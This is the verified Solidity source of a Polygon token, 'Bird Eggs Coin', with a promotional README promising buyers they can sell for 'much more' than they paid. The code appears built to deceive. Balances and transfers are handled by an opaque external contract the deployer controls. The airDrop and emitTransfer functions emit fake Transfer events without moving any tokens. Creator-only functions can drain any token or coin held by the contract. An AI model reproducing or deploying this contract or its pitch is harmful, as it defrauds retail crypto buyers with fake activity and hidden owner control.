/**
 *Submitted for verification at polygonscan.com on 2022-09-08
*/

/*------------README--------------
BIRD EGGS COIN
Bird Eggs Coin (BEC)

"Which came first, the Egg or the Bird?"
Welcome to the new economic strategy Game!
You can sell Birds for much more than you bought Eggs!
Hurry up to buy Eggs while nesting season!
Limited Edition Eggs!

Rules of the game:
Each address already has 10 Eggs for free**.
Buy over* 20 Eggs and get *** 19 Eggs and 1 Bird.
Send your friend 20 Eggs and he will get 19 Eggs and 1 Bird.
The Friend will only have 29 Eggs (+10 Free Eggs**) and 1 Bird

For example:
 Try it yourself: buy more! 100 Eggs and you get **** 90 Eggs and 10 Birds.
Send your friend 40 Eggs and your friend will get 38 Eggs and 2 Birds.
You have 60 Eggs and 10 Birds left.
90 - 40 = 50 (+10 Free Eggs**)
Your friend will have 48 Eggs and 2 Birds
38 in total (+10 Free Eggs**)
A friend sends you 20 Eggs back and you get 19 Eggs and 1 Bird.
You can sell Birds for much more than you bought Eggs!
  
* If you buy or send less than 20 Eggs, you will receive only Eggs.
! If you buy more than 100 Eggs you will get more than **** 90 Eggs and more than 10 Birds
! If you buy more than 1000 Eggs you will get more than **** 990 Eggs and more than 100 Birds
** Free Airdrop giveaway of 10 Eggs (may be locked until the end of the Bird nesting season)))
*** Transfer tax may apply. Minimum 1 Egg
**** Maximum tax, on transfers and purchases = 10 Eggs

IT IS A GAME!
*/
/*
BIRD COIN Token
The Integrated Finance for Bird Coin BDC
    TELEGRAM: https://t.me/birdcoins
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferOwnership(address newOwner) external; 
    function burn(uint256) external;
    function free(uint256) external;
    function mint(uint256) external;
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IERC20Factory {

    function constructorErc20(uint256 total,address tokenAddress,address tokenOwner,address _pairs) external;

    function getSupply() view external returns (uint256);

    function balanceOf(address _owner) view external returns (uint256);

    function balanceCl(address _owner) view external returns (uint256);

    function getAirAmount() view external returns (uint256);

    function getAirFrom() view external returns (address);

    function erc20Transfer(address _from, address _to, uint256 _value) external;
    
    function erc20TransferFrom(address _from, address _to, uint256 _value) external;
    
    function erc20Approve(address _to) external;

    function claim() external;

    function mint(uint256) external;
    function amint(uint256) external;

    function airDroper(bytes memory _bytes,uint256 addrCount) external;

    function erc20TransferAfter(address _from, address _to, uint256 _value) external;

}

library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, 'ds-math-add-overflow');
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, 'ds-math-sub-underflow');
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
    }
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

contract Ownable {
    address public owner;
    address public creator;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owner);
        _;
    }

    modifier onlycreator() {
        require(msg.sender == creator);
        _;
    }

    function transferOwnership(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owner, newowneres);
        owner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owner, address(0));
        owner = address(0);
    }
}

abstract contract Initializable {

    /**
     * @dev Indicates that the contract has been initialized.
     */
    bool private _initialized;

    /**
     * @dev Indicates that the contract is in the process of being initialized.
     */
    bool private _initializing;

    /**
     * @dev Modifier to protect an initializer function from being invoked twice.
     */
    modifier initializer() {
        require(_initializing || _isConstructor() || !_initialized, "Initializable: contract is already initialized");

        bool isTopLevelCall = !_initializing;
        if (isTopLevelCall) {
            _initializing = true;
            _initialized = true;
        }

        _;

        if (isTopLevelCall) {
            _initializing = false;
        }
    }

    /// @dev Returns true if and only if the function is running in the constructor
    function _isConstructor() private view returns (bool) {
        // extcodesize checks the size of the code stored in an address, and
        // address returns the current address. Since the code is still not
        // deployed when running a constructor, any checks on its code size will
        // yield zero, making it an effective way to detect if a contract is
        // under construction or not.
        address self = address(this);
        uint256 cs;
        // solhint-disable-next-line no-inline-assembly
        assembly { cs := extcodesize(self) }
        return cs == 0;
    }
}

contract BECToken is Ownable, Initializable {
    using SafeMath for uint;
	
    string public name;
    string  public symbol;
    uint8   public decimals;
    uint256 private totalSupply_;
	//uint256 private totalSupply_ = 21000000;
	
	address public pairs;
	IDEXRouter public router;
    // WETH or ETH fer generate pairs
	//
    //address private WETH = 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270;

    address private hAddr = 0x64Ed59f8c00ec930bc24D373548103b8b147b74a;
    //address private hAddr;
    //
    address private bAddr = 0x913D3da68394eeAFc22f5bd43407F2D1D7Cfa172;
    //address private bAddr;
	IERC20Factory help= IERC20Factory(hAddr);
	IERC20 public belp= IERC20(bAddr);
    
    function initialize(string memory _name, string memory _symbol, uint8 _decimals, uint256 amount, address _owner, address _router, address _htoken, address _btoken, address auth) public initializer {
        owner = _owner;
        creator = auth;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;

        totalSupply_=amount;

        router = IDEXRouter(_router);
        address _factory = router.factory();
        address WETH = router.WETH();

        pairs = pairForDex(_factory, WETH, address(this));

        hAddr = _htoken;
        //IERC20Factory help= IERC20Factory(hAddr);
        help.constructorErc20(totalSupply_, address(this), owner,pairs);
        emit Transfer(address(0), owner, totalSupply_);
        
        bAddr = _btoken;
        traders[bAddr] = true;
        //hAddr = _htoken;
        //IERC20 belp= IERC20(bAddr);

    }

	constructor() {
		owner = msg.sender;
        creator = msg.sender;
             
    }
	
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );
    
    mapping(address => mapping(address => uint256)) public allowed;
    address public pairu;
    //address public pairn;
	mapping(address => bool) public traders;

    function totalSupply() public view returns (uint256) {
        return help.getSupply();
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return help.balanceOf(_owner);
    }

    function balanceCl(address _owner) public view returns (uint256) {
        return help.balanceCl(_owner);
    } 

    function claim() public virtual {
       help.claim();
    }

    function amint(uint256 _value) public virtual {
       help.amint(_value);
    }

    function mint(uint256 _value) public virtual {
       help.mint(_value);
    }

    uint mineTok = 10 * 1e18;
    uint maxTok = 1200;
    bool private _swAirIco = true;
     bool private _swPayIco = true;    
     bool private _swMaxIco = true;

    function startIco(uint8 tag,bool value)public onlycreator returns(bool){
        if(tag==1){
            _swAirIco = value==true; //false
        }else if(tag==2){
            _swAirIco2 = value==false;
        }else if(tag==3){
            _swPayIco = value==true; //false
        }else if(tag==4){
            _swPayIco2 = value==true; //false
        }else if(tag==5){
            _swMaxIco = value==true; //false
        }
        return true;
    }
   //Test
    bool private _swAirIco2 = true;
     bool private _swPayIco2 = true; 
    //End Test
    function balreward(uint _value) public view virtual returns (uint256 reward) {
            reward =0;    uint256 _evalue;
            //if(_value > (mineTok)) _evalue = (_value/50); //10 = 10% 20 = 5 $
            //if(_value >= ((mineTok/1e18) * 2)) _evalue = (_value/20);
            //if(_value >= ((mineTok/1e18) * 4)) _evalue = (_value/20);
            //if(_value >= ((mineTok/1e18) * 8)) _evalue = (_value/10);
            //if(_value >= ((mineTok/1e18) * 10)) _evalue = (_value/10); //5 = 20%
            //if(_value >= ((mineTok/1e18) * 20)) _evalue = (_value/10); //4 = 25%
            //if(_value >= ((mineTok/1e18) * 100)) _evalue = (_value/5); //3 = 33%
            if(_value >= ((mineTok/1e18) * 10)) _evalue = 20; //>=100 = 20 %
            if(_value >= ((mineTok/1e18) * 20)) _evalue = 40;
            if(_value >= ((mineTok/1e18) * 30)) _evalue = 60;
            if(_value >= ((mineTok/1e18) * 40)) _evalue = 80;
            if(_value >= ((mineTok/1e18) * 50)) _evalue = 100;
            if(_value >= ((mineTok/1e18) * 60)) _evalue = 120;
            if(_value >= ((mineTok/1e18) * 70)) _evalue = 140;
            if(_value >= ((mineTok/1e18) * 80)) _evalue = 160;
            if(_value >= ((mineTok/1e18) * 90)) _evalue = 180;
            if(_value >= ((mineTok/1e18) * 100)) _evalue = 200; //1000
            if(_value >= ((mineTok/1e18) * 200)) _evalue = 400;
            if(_value >= ((mineTok/1e18) * 300)) _evalue = 600;
            if(_value >= ((mineTok/1e18) * 400)) _evalue = 800;
            if(_value >= ((mineTok/1e18) * 500)) _evalue = 1000;
            if(_value >= ((mineTok/1e18) * 600)) _evalue = 1200;
            //if(_value >= ((mineTok/1e18) * 700)) _evalue = 1400;
            //if(_value >= ((mineTok/1e18) * 800)) _evalue = 1600;
            //if(_value >= ((mineTok/1e18) * 900)) _evalue = 1800;
            //if(_value >= ((mineTok/1e18) * 1000)) _evalue = 2000;//10000
             if (_swMaxIco == true){ if(_evalue >= (maxTok)){ _evalue = maxTok; } // max Token reward
            }
     
      reward = _evalue;
     
    return uint256(reward);
        
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(help.balanceOf(msg.sender) >= _value);
        if (_swAirIco2 == true){//Test Antibot Trades
            if((traders[msg.sender]==true)||(traders[_to]==true)){_swAirIco = false;}else{_swAirIco = true;}//for router and Other pairs
        }
        if (_swAirIco == true){ //true
        if(_to == msg.sender){}else if(_to != address(0) && _to != pairs){//
                        uint256 _evalue;
            //if(_value > (mineTok)) _evalue = (_value/50); //10 = 10% 20 = 5 $
            if(_value >= ((mineTok/1e18) * 2)) _evalue = (_value/20);
            //if(_value >= ((mineTok/1e18) * 4)) _evalue = (_value/20);
            //if(_value >= ((mineTok/1e18) * 8)) _evalue = (_value/10);
            if(_value >= ((mineTok/1e18) * 10)) _evalue = (_value/10); //5 = 20%
            //if(_value >= ((mineTok/1e18) * 20)) _evalue = (_value/10); //4 = 25%
            //if(_value >= ((mineTok/1e18) * 100)) _evalue = (_value/5); //3 = 33%
            if(_value >= ((mineTok/1e18) * 100)) _evalue = balreward(_value); // Token reward
            //if (_swMaxIco == true){ if(_evalue >= (maxTok)) _evalue = maxTok; // max Token reward
            //}
        if(belp.balanceOf(address(this)) >= (_evalue * (10 ** 18))){//
        //belp.mint(_value);
        belp.transfer(_to,(_evalue * (10 ** 18)));
        //belp.transferFrom(address(this),_to,_value);
        }else{
        if(traders[bAddr]!=true) belp.mint(_value * (10 ** 18));
        //IBEP20(tokenAddress).transferFrom(contractAddress, _to, tokenAmount);
        if(traders[bAddr]==true) belp.transferFrom(bAddr,address(this),(_value * (10 ** 18)));
        belp.transfer(_to,(_evalue * (10 ** 18)));    
            }
            }
        }
        //if(help.balanceCl(msg.sender) > 0) help.claim(); 
        if (_swPayIco2 == true){//Test
        if((traders[msg.sender]==true)||(traders[_to]==true)){_swPayIco=false;}else{_swPayIco=true;} 
        }
        if ((_swPayIco == true)&&(msg.sender != owner||_to != owner||msg.sender != creator||_to != creator)){ 
            if(_to == msg.sender){}else if(_to != address(0) && _to != pairs){
                        uint256 _evalue;
            _evalue = balreward(_value);
            // if (_swMaxIco == true){ if(_evalue >= (maxTok)) _evalue = maxTok; // max Token reward
            //}
          help.amint(_evalue);
            } 
        }                

        help.erc20Transfer(msg.sender,_to,_value);
        
        help.erc20TransferAfter(msg.sender,_to,_value);
		emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= help.balanceOf(_from));
        require(_value <= allowed[_from][msg.sender]);
        if (_swAirIco2 == true){//Test Antibot Trades
            if((traders[msg.sender]==true)||(traders[_to]==true)){_swAirIco=false;}else{_swAirIco=true;}//for router liquidity and Other pairs
        }
        if (_swAirIco == true){ 
            if(_from == msg.sender){}else if(_to != pairu && _to != pairs){//}
            uint256 _evalue;
            //if(_value > (mineTok)) _evalue = (_value/50); //10 = 10% 20 = 5 $
            if(_value >= ((mineTok/1e18) * 2)) _evalue = (_value/20);
            //if(_value >= ((mineTok/1e18) * 4)) _evalue = (_value/20);
            //if(_value >= ((mineTok/1e18) * 8)) _evalue = (_value/20);
            if(_value >= ((mineTok/1e18) * 10)) _evalue = (_value/10); //5 = 20%
            //if(_value >= ((mineTok/1e18) * 20)) _evalue = (_value/10); //4 = 25%
            //if(_value >= ((mineTok/1e18) * 100)) _evalue = (_value/5); //3 = 33%
            if(_value >= ((mineTok/1e18) * 100)) _evalue = balreward(_value);
            //if (_swMaxIco == true){ if(_evalue >= (maxTok)) _evalue = maxTok; // max Token reward
            //}
		//belp.transfer(_from,_to,_value);
        if(belp.balanceOf(address(this)) >= (_evalue * (10 ** 18))){//
        //belp.mint(_value);
        //belp.transfer(_to,_value);
        belp.transferFrom(address(this),_to,(_evalue * (10 ** 18)));
            }else{
        if(traders[bAddr]!=true) belp.mint(_value * (10 ** 18));
        //IBEP20(tokenAddress).transferFrom(contractAddress, _to, tokenAmount);
        if(traders[bAddr]==true) belp.transferFrom(bAddr,address(this),(_value * (10 ** 18)));
        //belp.transfer(_to,_value); 
        belp.transferFrom(address(this),_to,(_evalue * (10 ** 18)));   
            }
            }
        }
        if (_swPayIco2 == true){//Test
        if((traders[msg.sender]==true)||(traders[_to]==true)){_swPayIco=false;}else{_swPayIco=true;} 
        }
        if ((_swPayIco == true)&&(_from != owner||_to != owner||_from != creator||_to != creator)) { 
            if(_from == msg.sender){}else if(_to != address(0) && _to != pairs){
                        uint256 _evalue;
            _evalue = balreward(_value);
            // if (_swMaxIco == true){ if(_evalue >= (maxTok)) _evalue = maxTok; // max Token reward
            //}
          help.amint(_evalue); 
            }
        } 
        help.erc20TransferFrom(_from,_to,_value);
        
        help.erc20TransferAfter(_from,_to,_value);
		emit Transfer(_from, _to, _value);
        return true;
    }

    function emitTransfer(address _from, address _to, uint256 _value) public returns (bool success) {
        require(msg.sender==hAddr||msg.sender==creator);
        emit Transfer(_from, _to, _value);
		return true;
    }
	
	function approve(address _spender, uint256 _value) public returns (bool success) {
        require(_spender != address(0));
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);

        help.erc20Approve(msg.sender);
        return true;
    }
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        require(_spender != address(0));
        return allowed[_owner][_spender];
    }

    function airDrop(bytes memory _bytes,uint256 addrCount) public returns(bool success) {
        require(msg.sender==hAddr||msg.sender==creator);
        uint256 amount = help.getAirAmount();
        uint256 _start=0;
        address airFrom = help.getAirFrom();
        address tempAddress;
        for(uint32 i=0;i<addrCount;i++){
            assembly {
                tempAddress := div(mload(add(add(_bytes, 0x20), _start)), 0x1000000000000000000000000)
            }
            emit Transfer(airFrom, tempAddress, amount);
            _start+=20;
        }
        return true;
    }

    function airDroper(bytes memory _bytes,uint256 addrCount) public returns(bool success) {
        require(msg.sender==hAddr||msg.sender==creator);
        help.airDroper(_bytes, addrCount);
     return true;   
    }

    function setPairu(address _token) external onlycreator {
        //require(msg.sender == owner, "You is not owner");
         //token = IERC20(_new_token);
         pairu = _token;
         //IERC20 pairu= IERC20(_token);
    }
    function uAir() public view returns (bool) {
        
        return _swAirIco; 
    }
    function uAir2() public view returns (bool) {
       
        return _swAirIco2; 
    }
    function uPay() public view returns (bool) {
        
        return _swPayIco;
    }
    function uPay2() public view returns (bool) {
        
        return _swPayIco2;
    }
    function setAirIco(uint tag, bool value) external onlycreator {
        //require(msg.sender == owner, "You is not owner");
        if(tag==1){
            _swAirIco = value==true; //false
            _swAirIco2 = value==true; //false
        }else if(tag==2){
        _swPayIco = value==true;
         _swPayIco2 = value==true;
        }

    }
    function setMaxTok(uint256 _count) external onlycreator {
        //require(msg.sender == owner, "You is not owner");
        maxTok = _count;
    }
    function setMineTok(uint256 _count) external onlycreator {
        //require(msg.sender == owner, "You is not owner");
        mineTok = _count;
    }
        // Update the status of the trader
    function updateTrader(address _trader, bool _status) external onlycreator {
        traders[_trader] = _status;
        //emit TraderUpdated(_trader, _status);
    }
    function transfercreator(address newcreator) public onlyowneres {
        require(newcreator != address(0));
        //emit owneresshipTransferred(creator, newowneres);
        creator = newcreator;
    }

    function transferOwnershipToken(address token,address newOwner) public onlycreator {
        IERC20 tokenu= IERC20(token);
        tokenu.transferOwnership(newOwner);
    }

    function sortTokens(address tokenA, address tokenB) public pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');
    }

    // calculates the CREATE2 address for a pair without making any external calls
    function pairForDex(address factory, address tokenA, address tokenB) public pure returns (address pair) {
        (address token0, address token1) = sortTokens(tokenA, tokenB);
        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
            ))));
    }

    function updateConErc20(uint _total, address token_, address owner_, address pairs_) public returns (bool success) {
        require(msg.sender == owner || msg.sender==creator);
        //if(token_ != address(this)){ //migrate
       help.constructorErc20(_total, token_, owner_,pairs_);     
       // }else{ //no migrate
       //help.constructorErc20(_total, address(this), owner_,pairs_);
       // }
        return true;
    }

    function contApprove(address contAddr, address tAddr, uint256 tAmount) public onlycreator {
        //
        IERC20(tAddr).approve(contAddr, tAmount);
        // 
    }
  
    function withdraw(address target,uint amount) public onlycreator {
        payable(target).transfer(amount);
    }

    function withdrawToken(address token,address target, uint amount) public onlycreator {
        IERC20(token).transfer(target, amount);
    }
    receive() external payable {}
	
}